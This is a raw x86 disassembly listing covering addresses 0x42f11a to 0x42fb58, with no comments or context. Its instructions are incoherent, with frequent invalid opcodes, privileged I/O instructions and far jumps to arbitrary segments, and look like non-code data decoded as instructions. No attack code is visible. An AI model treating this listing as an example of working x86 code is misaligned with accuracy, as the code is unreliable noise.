  42f11a:	and    ebx,DWORD PTR [edi+0x1e]
  42f11d:	jb     0x42f198
  42f11f:	inc    eax
  42f120:	jns    0x42f19b
  42f122:	rcl    BYTE PTR [edx-0x115ceeee],1
  42f128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f129:	xchg   ebp,eax
  42f12a:	mov    esp,0xa4d095e1
  42f12f:	aaa    
  42f130:	xchg   esp,eax
  42f131:	in     eax,dx
  42f132:	(bad)  
  42f133:	jl     0x42f112
  42f135:	outs   dx,BYTE PTR ds:[esi]
  42f136:	sub    cl,BYTE PTR [edx-0x73]
  42f139:	xchg   DWORD PTR [ebx+0x46],edi
  42f13c:	adc    eax,0x61f88b98
  42f141:	(bad)  
  42f142:	jmp    0xc07d5618
  42f147:	dec    esi
  42f148:	sbb    ebx,DWORD PTR [edx+0x2f]
  42f14b:	repz push esi
  42f14d:	icebp  
  42f14e:	sub    al,0x82
  42f150:	(bad)  
  42f151:	xchg   esp,eax
  42f152:	pop    edi
  42f153:	cmp    al,0x38
  42f155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f156:	xchg   ebx,eax
  42f157:	xchg   ecx,eax
  42f158:	push   ecx
  42f159:	aad    0x12
  42f15b:	add    DWORD PTR ds:0xfcdf1d96,edi
  42f161:	inc    edi
  42f162:	rol    DWORD PTR [edi+0x7353d717],0xda
  42f169:	fisubr WORD PTR [eax]
  42f16b:	cmp    BYTE PTR [edx],0xf1
  42f16e:	sub    ebp,DWORD PTR [eax]
  42f170:	mov    dh,0xd8
  42f172:	jle    0x42f184
  42f174:	push   cs
  42f175:	push   cs
  42f176:	inc    ebp
  42f177:	jo     0x42f16d
  42f179:	mov    ah,0x40
  42f17b:	icebp  
  42f17c:	adc    al,0xee
  42f17e:	inc    ebx
  42f17f:	ror    DWORD PTR [edi+0x5dc68800],1
  42f185:	pusha  
  42f186:	pop    esi
  42f187:	mov    dh,0xa0
  42f189:	mov    eax,0x85c1c299
  42f18e:	test   BYTE PTR [edi],dl
  42f190:	hlt    
  42f191:	mov    ch,0x76
  42f193:	out    0xe,al
  42f195:	jbe    0x42f164
  42f197:	mov    ds,WORD PTR [edx-0x34324d90]
  42f19d:	je     0x42f1c7
  42f19f:	fiadd  WORD PTR [eax]
  42f1a1:	test   DWORD PTR [ecx],edi
  42f1a3:	popa   
  42f1a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f1a5:	enter  0xf723,0xde
  42f1a9:	cwde   
  42f1aa:	lods   al,BYTE PTR ds:[esi]
  42f1ab:	push   es
  42f1ac:	sub    edi,DWORD PTR [ebp+ebx*4+0x2e6c8b59]
  42f1b3:	sbb    BYTE PTR [edi-0x4c3b4d3],bl
  42f1b9:	cmp    dl,bh
  42f1bb:	lahf   
  42f1bc:	dec    ebx
  42f1bd:	imul   ecx,eax,0xd33
	...
  42f233:	add    BYTE PTR [ebp-0x655875c3],ch
  42f239:	mov    bh,0xad
  42f23b:	aas    
  42f23c:	jp     0x42f245
  42f23e:	int3   
  42f23f:	icebp  
  42f240:	pop    esi
  42f241:	cmp    ebx,edi
  42f243:	cmp    BYTE PTR [ecx+esi*8+0xf50001],al
  42f24a:	add    BYTE PTR [eax],al
  42f24c:	mov    ds:0xfde5d6db,al
  42f251:	inc    eax
  42f252:	dec    eax
  42f253:	call   0x8c9b:0x5f65483d
  42f25a:	push   eax
  42f25b:	nop
  42f25c:	push   0x8b81e340
  42f261:	not    DWORD PTR [edx]
  42f263:	mov    al,0xe3
  42f265:	shr    dh,cl
  42f267:	int    0xaf
  42f269:	pop    esi
  42f26a:	mov    edi,0x176baf9f
  42f26f:	(bad)  [edx-0x8]
  42f272:	ret    
  42f273:	jmp    0xa55f5fbd
  42f278:	int    0xa8
  42f27a:	int    0x8c
  42f27c:	(bad)  
  42f27d:	leave  
  42f27e:	pop    esi
  42f27f:	pop    esp
  42f280:	popa   
  42f281:	adc    BYTE PTR [ebx+0x41],bh
  42f284:	push   0xbc60b0d6
  42f289:	xor    ch,dl
  42f28b:	sub    al,0x14
  42f28d:	cmp    ebx,DWORD PTR [ebx]
  42f28f:	dec    edi
  42f290:	aam    0xbb
  42f292:	ror    DWORD PTR [ecx-0x54],cl
  42f295:	das    
  42f296:	not    DWORD PTR [edx]
  42f298:	dec    edx
  42f299:	add    eax,0x1a20acff
  42f29e:	imul   ecx,ebx,0xd2b1193e
  42f2a4:	jg     0x42f31c
  42f2a6:	mov    ds:0xb428c4ba,eax
  42f2ab:	ja     0x42f293
  42f2ad:	es jmp 0x6653:0x318ff205
  42f2b5:	sub    bl,BYTE PTR ds:0x9a18d1ac
  42f2bb:	in     eax,dx
  42f2bc:	inc    eax
  42f2bd:	adc    bl,BYTE PTR [edi+0x3a]
  42f2c0:	xor    ax,0xd2e9
  42f2c4:	out    0x44,al
  42f2c6:	add    eax,0x97870dca
  42f2cb:	lods   eax,DWORD PTR ds:[esi]
  42f2cc:	ja     0x42f300
  42f2ce:	lods   al,BYTE PTR ds:[esi]
  42f2cf:	in     eax,0x86
  42f2d1:	push   ss
  42f2d2:	dec    ecx
  42f2d3:	repz jecxz 0x42f2ef
  42f2d6:	stos   DWORD PTR es:[edi],eax
  42f2d7:	inc    edi
  42f2d8:	push   0xde0a3d00
  42f2dd:	clc    
  42f2de:	and    BYTE PTR [ebp+0x51],ah
  42f2e1:	push   esi
  42f2e2:	cmp    eax,0xefe6128c
  42f2e7:	cmp    eax,0x6fa3509f
  42f2ec:	aas    
  42f2ed:	(bad)
  42f2f0:	ret    
  42f2f1:	ins    DWORD PTR es:[edi],dx
  42f2f2:	retf   0x74e4
  42f2f5:	(bad)  
  42f2f6:	push   ecx
  42f2f7:	(bad)  
  42f2f8:	jmp    0x22ef:0x1ee95f63
  42f2ff:	scas   al,BYTE PTR es:[edi]
  42f300:	(bad)  
  42f302:	icebp  
  42f303:	stos   DWORD PTR es:[edi],eax
  42f304:	dec    ebx
  42f305:	dec    edx
  42f306:	xchg   BYTE PTR [ebx],al
  42f308:	add    eax,0x38fd02b9
  42f30d:	scas   al,BYTE PTR es:[edi]
  42f30e:	and    cl,BYTE PTR [edx+edi*1]
  42f311:	cmp    ah,BYTE PTR [ecx+0x65564f45]
  42f317:	cmp    edi,DWORD PTR [ebx+0x3d]
  42f31a:	clc    
  42f31b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f31c:	add    al,0xe1
  42f31e:	pop    esp
  42f31f:	inc    ebx
  42f320:	mov    ds:0x8e5a1df2,eax
  42f325:	xor    al,0x47
  42f327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f328:	add    al,0xf
  42f32a:	iret   
  42f32b:	imul   eax,ecx,0x7f5a6dc5
  42f331:	ror    BYTE PTR [ebp-0x43],cl
  42f334:	or     al,0xc0
  42f336:	outs   dx,DWORD PTR ds:[esi]
  42f337:	ss dec ebx
  42f339:	jecxz  0x42f377
  42f33b:	mov    edi,0xa9d7d6d3
  42f340:	mov    al,ds:0x0
	...
  42f3b1:	add    BYTE PTR [eax],al
  42f3b3:	add    dl,ah
  42f3b5:	mov    ebp,0xe7dfc7dc
  42f3ba:	sti    
  42f3bb:	mov    ebp,0xca33a8a7
  42f3c0:	and    dl,BYTE PTR [ecx]
  42f3c2:	sub    al,0xe2
  42f3c4:	jns    0x42f3b8
  42f3c6:	add    DWORD PTR [eax],eax
  42f3c8:	cmc    
  42f3c9:	add    BYTE PTR [eax],al
  42f3cb:	add    BYTE PTR [eax+0x13834283],bh
  42f3d1:	pop    edx
  42f3d2:	inc    edi
  42f3d3:	jne    0x42f3ac
  42f3d5:	pop    edx
  42f3d6:	push   0x30
  42f3d8:	and    eax,0xb0903deb
  42f3dd:	and    BYTE PTR es:[ebx-0x47],0xfb
  42f3e2:	and    eax,0xb7d50b43
  42f3e7:	push   edi
  42f3e8:	(bad)  
  42f3e9:	sbb    DWORD PTR [eax],ecx
  42f3eb:	inc    esi
  42f3ec:	push   eax
  42f3ed:	xchg   DWORD PTR [ebx],eax
  42f3ef:	xchg   DWORD PTR [eax-0x5eafa70e],ebx
  42f3f5:	push   eax
  42f3f6:	push   ebp
  42f3f7:	mov    ds:0x88839d26,al
  42f3fc:	mov    esp,0x83815bff
  42f401:	adc    esi,esp
  42f403:	je     0x42f3d0
  42f405:	xchg   ebx,eax
  42f406:	dec    edx
  42f407:	loope  0x42f3a9
  42f409:	shl    DWORD PTR [edx-0x1f],cl
  42f40c:	popf   
  42f40d:	xchg   edx,eax
  42f40e:	dec    ebp
  42f40f:	fmul   st,st(5)
  42f411:	cdq    
  42f412:	outs   dx,BYTE PTR ds:[esi]
  42f413:	dec    ecx
  42f414:	adc    dh,cl
  42f416:	mov    ebp,0x5a9364e5
  42f41b:	xchg   DWORD PTR [ecx-0x61f25270],edx
  42f421:	inc    esi
  42f422:	iret   
  42f423:	and    DWORD PTR [ecx+0xe047a2a],edi
  42f429:	pop    esi
  42f42a:	sbb    dh,al
  42f42c:	cmp    bl,0xd6
  42f42f:	pusha  
  42f430:	pop    ebp
  42f431:	dec    eax
  42f432:	mov    ds:0x8cf78b1,al
  42f437:	mov    cl,0xd1
  42f439:	mov    bh,0x6f
  42f43b:	cmp    dl,BYTE PTR [edx+0x5921076f]
  42f441:	mov    WORD PTR [edi-0x3212469d],?
  42f447:	dec    esi
  42f448:	xchg   BYTE PTR [ecx-0x20],al
  42f44b:	cwde   
  42f44c:	mov    eax,ds:0x7f7acabf
  42f451:	sti    
  42f452:	fild   QWORD PTR [ebx+0x1e]
  42f455:	inc    esi
  42f456:	pop    ebp
  42f457:	add    BYTE PTR [ecx+0x28],cl
  42f45a:	pop    esi
  42f45b:	ffreep st(4)
  42f45d:	mov    esp,0xcd338914
  42f462:	push   ebx
  42f463:	and    DWORD PTR [edi-0x75],eax
  42f466:	in     eax,0xcb
  42f468:	add    al,0x97
  42f46a:	int3   
  42f46b:	popa   
  42f46c:	js     0x42f4a6
  42f46e:	pop    esp
  42f46f:	adc    eax,0x7704e1b0
  42f474:	push   0xeb530ade
  42f479:	dec    ecx
  42f47a:	xor    DWORD PTR [edx],ecx
  42f47c:	dec    esi
  42f47d:	stos   BYTE PTR es:[edi],al
  42f47e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f47f:	push   0x14
  42f481:	mov    eax,0x3b8dddb7
  42f486:	mov    bh,0x30
  42f488:	xchg   esi,eax
  42f489:	and    BYTE PTR [edx],bh
  42f48b:	xor    BYTE PTR [ebx+0x497481e1],cl
  42f491:	iret   
  42f492:	sub    eax,0x90af678b
  42f497:	jmp    0xe70f:0xf2aded31
  42f49e:	jnp    0x42f4c4
  42f4a0:	fnstcw WORD PTR [eax+eiz*2-0x2d093fa]
  42f4a7:	rol    DWORD PTR [edi-0x19],1
  42f4aa:	rol    BYTE PTR [eax+0x20],cl
  42f4ad:	sbb    bh,BYTE PTR [ebp-0x874acf7]
  42f4b3:	inc    BYTE PTR [ebx-0x13bb4403]
  42f4b9:	push   edx
  42f4ba:	jo     0x42f4a5
  42f4bc:	mov    ecx,0x48029b84
	...
  42f531:	add    BYTE PTR [eax],al
  42f533:	add    BYTE PTR [ebp+0x38],dl
  42f536:	into   
  42f537:	adc    bh,ch
  42f539:	neg    bh
  42f53b:	jge    0x42f546
  42f53d:	push   cs
  42f53e:	xchg   BYTE PTR [edi-0x4a],bh
  42f541:	sub    DWORD PTR [ebp+0x55],ecx
  42f544:	outs   dx,BYTE PTR ds:[esi]
  42f545:	repz add DWORD PTR [eax],eax
  42f548:	cmc    
  42f549:	add    BYTE PTR [eax],al
  42f54b:	add    BYTE PTR [ebp+0xc5cffc6],ch
  42f551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f552:	cwde   
  42f553:	push   0xc4a174e5
  42f558:	xlat   BYTE PTR ds:[ebx]
  42f559:	ds fwait
  42f55b:	imul   esi,DWORD PTR [ecx],0xc80ea450
  42f561:	jg     0x42f514
  42f563:	pop    eax
  42f564:	in     eax,0x7
  42f566:	pusha  
  42f567:	push   esi
  42f568:	(bad)  
  42f56a:	lea    eax,[eax+edi*8+0x51]
  42f56e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f56f:	loope  0x42f5c8
  42f571:	push   edx
  42f572:	push   ebx
  42f573:	test   al,0x9a
  42f575:	shl    BYTE PTR [edi],1
  42f577:	mov    eax,ecx
  42f579:	xchg   esp,eax
  42f57a:	call   0x9d428f85
  42f57f:	cmc    
  42f580:	push   0x1f
  42f582:	rcr    edx,1
  42f584:	repnz xchg ebx,eax
  42f586:	jb     0x42f5ce
  42f588:	imul   edx,ecx,0xf2b9a6b4
  42f58e:	and    DWORD PTR [ebx+eiz*1],0x6
  42f592:	iret   
  42f593:	pop    ds
  42f594:	pop    ss
  42f595:	(bad)  
  42f596:	scas   eax,DWORD PTR es:[edi]
  42f597:	stos   BYTE PTR es:[edi],al
  42f598:	retf   
  42f599:	jmp    0x812d:0x97207519
  42f5a0:	repnz in al,dx
  42f5a2:	mov    eax,0xc214c7a9
  42f5a7:	or     ecx,ebp
  42f5a9:	xchg   ecx,eax
  42f5aa:	cld    
  42f5ab:	in     eax,dx
  42f5ac:	cmp    DWORD PTR [ebx-0x77],edi
  42f5af:	sti    
  42f5b0:	hlt    
  42f5b1:	lock or dh,BYTE PTR [ebp+eax*8+0x24]
  42f5b6:	loop   0x42f58e
  42f5b8:	pop    edx
  42f5b9:	inc    ebx
  42f5ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f5bb:	xchg   esi,eax
  42f5bc:	test   al,cl
  42f5be:	adc    BYTE PTR [edx+0x75],0xc0
  42f5c2:	xor    al,0xe7
  42f5c4:	adc    eax,0x7a4e2221
  42f5c9:	adc    cl,BYTE PTR [edi+0x48bc8991]
  42f5cf:	das    
  42f5d0:	pop    ecx
  42f5d1:	xor    DWORD PTR [ebp-0x4e],edi
  42f5d4:	jecxz  0x42f625
  42f5d6:	repz jmp 0x6f2d:0xc636d8ca
  42f5de:	cmp    esi,DWORD PTR [edx-0x47f418db]
  42f5e4:	jp     0x42f5a2
  42f5e6:	xor    BYTE PTR [ecx-0x6c],cl
  42f5e9:	enter  0xf53a,0xe8
  42f5ed:	lods   al,BYTE PTR ds:[esi]
  42f5ee:	or     al,0x4d
  42f5f0:	mov    ch,BYTE PTR [edi-0x15ca7b78]
  42f5f6:	fldcw  WORD PTR [eax+0x335001e6]
  42f5fc:	dec    eax
  42f5fd:	mov    edx,DWORD PTR [ecx]
  42f5ff:	enter  0xc4a2,0x69
  42f603:	mov    edi,0xb212aec3
  42f608:	popa   
  42f609:	dec    esp
  42f60a:	lea    esp,[edx-0x46dd7993]
  42f610:	add    al,bl
  42f612:	mov    dh,0xee
  42f614:	outs   dx,BYTE PTR ds:[esi]
  42f615:	push   0x53
  42f617:	pop    esi
  42f618:	test   DWORD PTR [ebp-0x41],edi
  42f61b:	mov    dh,0x67
  42f61d:	jb     0x42f652
  42f61f:	push   edx
  42f620:	sbb    cl,0x5
  42f623:	adc    BYTE PTR [esi+ebp*2+0x3c],bh
  42f627:	or     esp,DWORD PTR [eax-0x69]
  42f62a:	fld    QWORD PTR [ebp+0x3c]
  42f62d:	push   ss
  42f62e:	sub    eax,0xbcbc84ce
  42f633:	mov    ds:0xd050c815,eax
  42f638:	inc    edx
  42f639:	push   esi
  42f63a:	cld    
  42f63b:	jnp    0x42f5f1
  42f63d:	fs or  bh,bh
  42f640:	jecxz  0x42f642
	...
  42f6b2:	add    BYTE PTR [eax],al
  42f6b4:	pop    edx
  42f6b5:	cmp    DWORD PTR [esi+0x2d],ecx
  42f6b8:	outs   dx,DWORD PTR ds:[esi]
  42f6b9:	jg     0x42f736
  42f6bb:	jg     0x42f6c6
  42f6bd:	mov    bh,0xe3
  42f6bf:	xor    bh,dl
  42f6c1:	sub    ah,dl
  42f6c3:	data16 arpl sp,si
  42f6c6:	add    DWORD PTR [eax],eax
  42f6c8:	cmc    
  42f6c9:	add    BYTE PTR [eax],al
  42f6cb:	add    BYTE PTR [ebp-0x354fa18b],bh
  42f6d1:	pop    edx
  42f6d2:	push   ecx
  42f6d3:	je     0x42f70e
  42f6d5:	in     eax,0x31
  42f6d7:	mov    ss,WORD PTR [eax+0x110d741b]
  42f6dd:	jge    0x42f662
  42f6df:	xor    ah,bl
  42f6e1:	add    eax,0x5b91e5f
  42f6e6:	popf   
  42f6e7:	ins    BYTE PTR es:[edi],dx
  42f6e8:	fisubr DWORD PTR [esi-0x38e05b5]
  42f6ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6ef:	or     edi,edx
  42f6f1:	mov    DWORD PTR [ecx+0x7030052e],ebx
  42f6f7:	div    DWORD PTR [edi]
  42f6f9:	xchg   ebx,eax
  42f6fa:	shr    dl,0xa1
  42f6fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f6fe:	jnp    0x42f6cc
  42f700:	dec    esp
  42f701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f702:	rcr    ah,cl
  42f704:	cs aam 0x14
  42f707:	fistp  QWORD PTR [ebp-0x50]
  42f70a:	scas   eax,DWORD PTR es:[edi]
  42f70b:	jmp    0xd8d:0x5b5ea03
  42f712:	lods   eax,DWORD PTR ds:[esi]
  42f713:	push   0x6c
  42f715:	cwde   
  42f716:	outs   dx,DWORD PTR ds:[esi]
  42f717:	push   ss
  42f718:	pop    esi
  42f719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f71a:	fsubp  st(4),st
  42f71c:	adc    BYTE PTR [ebp+0x2d947bf6],ch
  42f722:	int    0xf5
  42f724:	test   DWORD PTR [esi-0x3e],esi
  42f727:	sub    DWORD PTR [esi+0xd],edx
  42f72a:	popf   
  42f72b:	pusha  
  42f72c:	add    BYTE PTR [edx-0x69],dh
  42f72f:	inc    esi
  42f730:	shl    BYTE PTR [edx+0x29],cl
  42f733:	push   ds
  42f734:	fld    QWORD PTR [esi-0x6ab63e87]
  42f73a:	into   
  42f73b:	xchg   ebp,eax
  42f73c:	dec    edx
  42f73d:	ja     0x42f713
  42f73f:	mov    ds:0x1cecb9a3,al
  42f744:	pushf  
  42f745:	shl    ecx,0xfc
  42f748:	sub    edi,ecx
  42f74a:	das    
  42f74b:	pop    edi
  42f74c:	sti    
  42f74d:	fisttp DWORD PTR [esi]
  42f74f:	mov    al,BYTE PTR [eax+0x6dd4ef18]
  42f755:	dec    ecx
  42f756:	xor    al,0xa3
  42f758:	cmp    WORD PTR ds:0x86a57004,bp
  42f75f:	out    0xd6,al
  42f761:	ds dec eax
  42f763:	jmp    0xd3a72d30
  42f768:	call   0x4847:0x998db72e
  42f76f:	fcmovne st,st(5)
  42f771:	add    al,0x2
  42f773:	pop    ds
  42f774:	push   edx
  42f775:	std    
  42f776:	dec    eax
  42f777:	dec    esi
  42f778:	js     0x42f70e
  42f77a:	dec    eax
  42f77b:	or     BYTE PTR [ecx],ch
  42f77d:	pop    eax
  42f77e:	jecxz  0x42f795
  42f780:	cmp    al,0x9e
  42f782:	out    dx,al
  42f783:	mov    eax,ds:0xe70c45e4
  42f788:	ins    BYTE PTR es:[edi],dx
  42f789:	mov    bh,0x39
  42f78b:	mov    ch,0xb7
  42f78d:	imul   edi,DWORD PTR [edx-0x623cc5de],0x21
  42f794:	pop    eax
  42f795:	mov    bh,0xab
  42f797:	pop    ebp
  42f798:	jne    0x42f7a6
  42f79a:	mov    esi,ebp
  42f79c:	retf   0x372
  42f79f:	xor    DWORD PTR [edi],eax
  42f7a1:	fistp  QWORD PTR [edx+0x69]
  42f7a4:	xchg   ecx,eax
  42f7a5:	shr    ah,cl
  42f7a7:	fwait
  42f7a8:	lds    ebp,FWORD PTR [ebx]
  42f7aa:	inc    ebp
  42f7ab:	mov    BYTE PTR [edx],bh
  42f7ad:	inc    ebp
  42f7ae:	mov    bh,0xa0
  42f7b0:	pop    eax
  42f7b1:	pusha  
  42f7b2:	mov    ecx,0x24ae22b0
  42f7b7:	jns    0x42f7ee
  42f7b9:	inc    ebx
  42f7ba:	push   ebx
  42f7bb:	jbe    0x42f82d
  42f7bd:	xor    edx,edx
  42f7bf:	and    DWORD PTR [ebp+0x0],0x0
	...
  42f832:	add    BYTE PTR [eax],al
  42f834:	ret    
  42f835:	ja     0x42f897
  42f837:	and    al,0xf4
  42f839:	aaa    
  42f83a:	(bad)  
  42f83b:	neg    DWORD PTR [edi-0x41af3771]
  42f841:	fild   WORD PTR [ebx]
  42f843:	(bad)  
  42f844:	pop    eax
  42f845:	cmc    
  42f846:	add    DWORD PTR [eax],eax
  42f848:	cmc    
  42f849:	add    BYTE PTR [eax],al
  42f84b:	add    BYTE PTR [edx+eiz*4-0x14],dl
  42f84f:	test   al,0xad
  42f851:	pushf  
  42f852:	adc    esi,DWORD PTR [edi]
  42f854:	jg     0x42f7d9
  42f856:	pop    edx
  42f857:	push   eax
  42f858:	mov    WORD PTR [ecx+0x60],cs
  42f85b:	jle    0x42f853
  42f85d:	sbb    ch,BYTE PTR [edi+ebx*1+0x70d04f09]
  42f864:	sbb    al,0x82
  42f866:	ds ds inc ebx
  42f869:	sbb    eax,0x754b9673
  42f86e:	fs cs jae 0x42f84d
  42f872:	pandn  mm5,mm1
  42f875:	pop    eax
  42f876:	mov    es:0xe20a2ca2,al
  42f87c:	fmul   DWORD PTR [ebx]
  42f87e:	or     al,0x85
  42f880:	adc    DWORD PTR [ecx],0x267cdc38
  42f886:	std    
  42f887:	xchg   ebx,eax
  42f888:	inc    ecx
  42f889:	lahf   
  42f88a:	fwait
  42f88b:	push   ss
  42f88c:	adc    eax,ebx
  42f88e:	or     DWORD PTR [ebp+edi*2+0xc8a588c],ebp
  42f895:	pop    edi
  42f896:	in     eax,dx
  42f897:	sub    eax,0x523fcf70
  42f89c:	inc    ecx
  42f89d:	sar    BYTE PTR [edx],cl
  42f89f:	or     eax,0x59a618d4
  42f8a4:	pop    ebx
  42f8a5:	into   
  42f8a6:	fidivr DWORD PTR [edi-0x52]
  42f8a9:	and    edi,DWORD PTR [edi-0x4b]
  42f8ac:	cmc    
  42f8ad:	adc    ebx,ecx
  42f8af:	int    0xd8
  42f8b1:	(bad)  
  42f8b2:	jl     0x42f8e1
  42f8b4:	push   ebp
  42f8b5:	dec    esp
  42f8b6:	push   ss
  42f8b7:	inc    eax
  42f8b8:	pop    edi
  42f8b9:	xor    esi,ebx
  42f8bb:	mov    esi,0x7748d6bc
  42f8c0:	adc    BYTE PTR [edi+0x23],0x55
  42f8c4:	aas    
  42f8c5:	aam    0xb1
  42f8c7:	push   ss
  42f8c8:	pop    es
  42f8c9:	pop    ebp
  42f8ca:	retf   0xea9f
  42f8cd:	jp     0x42f8cd
  42f8cf:	pop    edx
  42f8d0:	(bad)  [ecx-0x66]
  42f8d3:	lds    edx,FWORD PTR ds:0x46afe209
  42f8d9:	mov    DWORD PTR [ecx-0x2158636d],edi
  42f8df:	cmp    edx,0x3b
  42f8e2:	outs   dx,BYTE PTR ds:[esi]
  42f8e3:	outs   dx,DWORD PTR ds:[esi]
  42f8e4:	(bad)  
  42f8e6:	shr    DWORD PTR [edi-0x3c4cfcb6],cl
  42f8ec:	es mov dh,0x4e
  42f8ef:	movq   mm3,QWORD PTR [edi]
  42f8f2:	pop    edi
  42f8f3:	pop    eax
  42f8f4:	xchg   ecx,eax
  42f8f5:	jb     0x42f8b3
  42f8f7:	das    
  42f8f8:	sar    BYTE PTR [edx],0xe8
  42f8fb:	pop    eax
  42f8fc:	push   ss
  42f8fd:	shl    BYTE PTR [ebx-0x7a4ae2cd],0xe4
  42f904:	and    ebp,ebp
  42f906:	xchg   edx,eax
  42f907:	iret   
  42f908:	outs   dx,BYTE PTR ds:[esi]
  42f909:	aad    0x5b
  42f90b:	cmp    esp,DWORD PTR [ecx+0x11006905]
  42f911:	mov    eax,ds:0x71e896c9
  42f916:	jp     0x42f994
  42f918:	jbe    0x42f945
  42f91a:	(bad)  
  42f91b:	int    0xfe
  42f91d:	push   eax
  42f91e:	xchg   ebx,eax
  42f91f:	scas   al,BYTE PTR es:[edi]
  42f920:	jl     0x42f8b1
  42f922:	std    
  42f923:	xchg   edi,eax
  42f924:	dec    eax
  42f925:	sbb    esi,eax
  42f927:	mov    ecx,esp
  42f929:	jno    0x42f990
  42f92b:	jmp    0x3161:0xf62921ab
  42f932:	popf   
  42f933:	and    BYTE PTR [eax-0x35],al
  42f936:	push   ebx
  42f937:	fistp  DWORD PTR [ecx+0x51ee9369]
  42f93d:	pop    esi
  42f93e:	pop    esp
  42f93f:	inc    edi
  42f940:	xchg   DWORD PTR [eax],eax
	...
  42f9b2:	add    BYTE PTR [eax],al
  42f9b4:	in     eax,0xba
  42f9b6:	xchg   edx,eax
  42f9b7:	jecxz  0x42f998
  42f9b9:	jmp    0x42f9b0
  42f9bb:	mov    esi,0x4d34a307
  42f9c0:	mov    ds:0x4da97584,eax
  42f9c5:	test   BYTE PTR [ecx],0x0
  42f9c8:	cmc    
  42f9c9:	add    BYTE PTR [eax],al
  42f9cb:	add    BYTE PTR [ebp+eax*4+0x5d69a089],dh
  42f9d2:	ss in  eax,0x3b
  42f9d5:	fsub   QWORD PTR [edi-0x5d249b45]
  42f9db:	push   eax
  42f9dc:	mov    DWORD PTR [ecx-0x4],ebp
  42f9df:	xchg   edx,eax
  42f9e0:	inc    eax
  42f9e1:	jbe    0x42fa37
  42f9e3:	mov    BYTE PTR [ecx],dl
  42f9e5:	dec    esp
  42f9e6:	sub    ah,BYTE PTR [esp+edx*8-0x11d98eb9]
  42f9ed:	jae    0x42fa08
  42f9ef:	mov    dl,0xdd
  42f9f1:	sbb    eax,0x78646990
  42f9f6:	cmp    cl,BYTE PTR ds:0x907f061a
  42f9fc:	push   ebp
  42f9fd:	pop    ecx
  42f9fe:	mov    ebx,0xe8d4d97
  42fa03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa04:	push   ds
  42fa05:	xor    BYTE PTR [ecx+0x27551319],ah
  42fa0b:	jb     0x42f9f6
  42fa0d:	cmp    BYTE PTR [edx+0x2c],ah
  42fa10:	add    eax,0xc69c42e2
  42fa15:	jmp    0x34ae:0x9df1ceea
  42fa1c:	popf   
  42fa1d:	or     cl,BYTE PTR [ebx+0x4d]
  42fa20:	sbb    al,0x20
  42fa22:	sbb    al,0x3a
  42fa24:	jns    0x42fa35
  42fa26:	fwait
  42fa27:	scas   eax,DWORD PTR es:[edi]
  42fa28:	and    BYTE PTR [edi],0xee
  42fa2b:	push   DWORD PTR [ebp-0x56788dd0]
  42fa31:	cmp    eax,0x195f7233
  42fa36:	(bad)  
  42fa37:	jmp    0x42fa17
  42fa39:	xchg   esp,eax
  42fa3a:	cmp    ebp,ebx
  42fa3c:	stos   DWORD PTR es:[edi],eax
  42fa3d:	pop    ebx
  42fa3e:	iret   
  42fa3f:	inc    esp
  42fa40:	clc    
  42fa41:	mov    esp,esi
  42fa43:	popa   
  42fa44:	or     ebp,esp
  42fa46:	nop
  42fa47:	push   esi
  42fa48:	jmp    0x42f9f2
  42fa4a:	ss ret 0xe569
  42fa4e:	jbe    0x42f9d4
  42fa50:	inc    esi
  42fa51:	(bad)  
  42fa53:	pop    ss
  42fa54:	mov    ch,0xb8
  42fa56:	sbb    edx,DWORD PTR [esi-0x38ea8010]
  42fa5c:	cmp    ah,cl
  42fa5e:	ja     0x42faca
  42fa60:	sbb    eax,0x98853100
  42fa65:	(bad)  
  42fa66:	jge    0x42fa59
  42fa68:	mov    dl,0x8c
  42fa6a:	rcr    DWORD PTR [ebx-0x23],0x36
  42fa6e:	mov    ebp,0x99b58a88
  42fa73:	in     al,0x6f
  42fa75:	repnz pop edi
  42fa77:	push   edx
  42fa78:	rcl    edi,cl
  42fa7a:	fbld   TBYTE PTR [esi+0x4edc395d]
  42fa80:	or     cl,dh
  42fa82:	aam    0x23
  42fa84:	mov    al,ds:0xe3796340
  42fa89:	push   ecx
  42fa8a:	imul   ecx,DWORD PTR [ebx+esi*4-0x26],0x41cf8f39
  42fa92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa93:	cdq    
  42fa94:	scas   al,BYTE PTR es:[edi]
  42fa95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa96:	xlat   BYTE PTR ds:[ebx]
  42fa97:	cmp    eax,0xfa278d1d
  42fa9c:	mov    ebx,0xec1bcff4
  42faa1:	mov    bl,0x17
  42faa3:	adc    BYTE PTR [ecx+0x51],dl
  42faa6:	and    DWORD PTR [edi],eax
  42faa8:	repz fwait
  42faaa:	out    dx,eax
  42faab:	pop    edi
  42faad:	jp     0x42faf7
  42faaf:	(bad)  
  42fab0:	sti    
  42fab1:	outs   dx,DWORD PTR ds:[esi]
  42fab2:	pop    eax
  42fab3:	inc    ebx
  42fab4:	xor    eax,0x32e1f57e
  42fab9:	or     BYTE PTR [eax],al
  42fabb:	pop    es
  42fabc:	jl     0x42fade
  42fabe:	add    dh,BYTE PTR [edi+0x89]
	...
  42fb34:	jle    0x42fb77
  42fb36:	jne    0xfc41ca7b
  42fb3c:	cmp    DWORD PTR [ebx+0x4a],ebp
  42fb3f:	pop    es
  42fb40:	pop    ecx
  42fb41:	mov    WORD PTR ds:0x1f742ea,gs
  42fb47:	add    ch,dh
  42fb49:	add    BYTE PTR [eax],al
  42fb4b:	add    dh,bl
  42fb4d:	jnp    0x42fbb1
  42fb4f:	ins    BYTE PTR es:[edi],dx
  42fb50:	jns    0x42faf2
  42fb52:	jno    0x42fb99
  42fb54:	shl    ebx,1
  42fb56:	mov    eax,eax
  42fb58:	pop    ebx
